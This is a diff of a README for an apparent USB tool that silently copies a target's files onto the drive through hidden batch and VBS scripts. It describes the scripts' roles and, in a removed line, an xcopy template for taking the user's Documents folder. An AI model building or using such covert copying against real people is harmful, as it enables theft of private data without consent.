@@ -11,7 +11,13 @@ Plug it in, if it does not automatically run, click on launch.bat
 
 The program will launch, and the files will be transferred to your USB drive in the background.  
 
-The files.bat is where you change what data you want to obtain. EXAMPLE: %backupcmd% "%USERPROFILE%\Documents" "%drive%\All\S Documents" can be changed to: %backupcmd% "%USERPROFILE%\Downloads" "%drive%\All\S Downloads"
+Launch.bat = launches invisible.vbs and files.bat
+
+invisible.vbs = minimizes the the file transfer
+
+files.bat = uses xcopy to transfer the files/folders
+
+"All" Folder is where your targets files will be located. 
 
 This was created for educational purposes.
 https://github.com/spdghost408/GhostUSBtool/wiki
